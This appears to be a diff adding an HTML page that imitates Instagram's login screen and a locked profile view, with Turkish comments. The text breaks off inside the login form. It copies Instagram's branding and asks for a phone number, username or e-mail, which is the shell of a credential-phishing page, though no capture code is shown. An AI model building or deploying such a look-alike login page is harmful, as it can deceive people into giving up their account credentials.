@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #262626; }
+        
+        /* --- GİRİŞ EKRANI (LOGIN) --- */
+        .login-container { width: 350px; background: white; border: 1px solid #dbdbdb; padding: 40px; text-align: center; margin-bottom: 10px; }
+        .insta-logo { width: 175px; margin-bottom: 40px; }
+        .input-box { width: 100%; padding: 9px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; margin-bottom: 6px; outline: none; }
+        .input-box:focus { border-color: #a8a8a8; }
+        .login-btn { width: 100%; background-color: #0095f6; border: none; color: white; padding: 7px 0; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 8px; }
+        .login-btn:disabled { background-color: #b2dffc; cursor: default; }
+        .error-message { color: #ed4956; font-size: 14px; margin-top: 15px; display: none; font-weight: 500; }
+
+        /* --- PROFİL EKRANI (DASHBOARD) --- */
+        .profile-container { display: none; width: 100%; max-width: 935px; margin: 0 auto; padding: 30px 20px; pointer-events: none; /* 🚫 Ekran tamamen kilitli */ user-select: none; }
+        
+        /* Üst Profil Bilgisi */
+        .profile-header { display: flex; align-items: center; margin-bottom: 44px; border-bottom: 1px solid #dbdbdb; padding-bottom: 44px; }
+        .pfp-wrapper { width: 150px; height: 150px; border-radius: 50%; overflow: hidden; margin-right: 100px; border: 1px solid #dbdbdb; }
+        .pfp-wrapper img { width: 100%; height: 100%; object-fit: cover; }
+        .profile-info h1 { font-size: 28px; font-weight: 300; margin-bottom: 20px; display: inline-block; }
+        .verified-badge { color: #0095f6; font-size: 20px; margin-left: 8px; vertical-align: middle; }
+        .stats { display: flex; gap: 40px; margin-bottom: 20px; font-size: 16px; }
+        .stats span { font-weight: bold; }
+        .stats li { list-style: none; }
+        .bio { font-size: 16px; font-weight: 600; line-height: 1.5; }
+        .bio span { font-weight: 400; color: #8e8e8e; display: block; margin-top: 5px; }
+
+        /* Post Izgarası (Grid) */
+        .posts-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 28px; }
+        .post-card { position: relative; aspect-ratio: 1 / 1; background-color: #efefef; overflow: hidden; border: 1px solid #dbdbdb; }
+        .post-card img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.3s; }
+        
+        .post-card:hover img { transform: scale(1.02); }
+        .post-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.3); display: flex; justify-content: center; align-items: center; color: white; font-weight: bold; font-size: 18px; opacity: 0; transition: opacity 0.2s; }
+        .post-card:hover .post-overlay { opacity: 1; }
+
+        /* Mobil Duyarlılık */
+        @media (max-width: 735px) {
+            .pfp-wrapper { margin-right: 30px; width: 80px; height: 80px; }
+            .profile-header { margin-bottom: 20px; padding-bottom: 20px; }
+            .profile-info h1 { font-size: 22px; }
+            .stats { gap: 15px; font-size: 13px; }
+            .posts-grid { gap: 3px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div id="loginBox" class="login-container">
+        <img class="insta-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+        
+        <form id="instaLoginForm" onsubmit="handleLogin(event)">
+            <input type="text" id="username" class="input-box" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="off">
+            <input
